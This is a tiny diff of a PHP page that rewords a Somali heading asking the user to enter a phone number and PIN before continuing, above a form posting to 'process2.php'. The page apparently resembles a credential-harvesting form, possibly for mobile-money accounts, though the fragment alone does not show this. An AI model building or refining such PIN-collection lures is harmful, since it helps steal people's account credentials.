@@ -21,7 +21,7 @@ if(isset($_GET['error'])){
 
 <div class="container">
 
-<h2>Gel lambarka taleefanka iyo PIN-ka</h2>
+<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
 
 <form action="process2.php" method="POST">
 
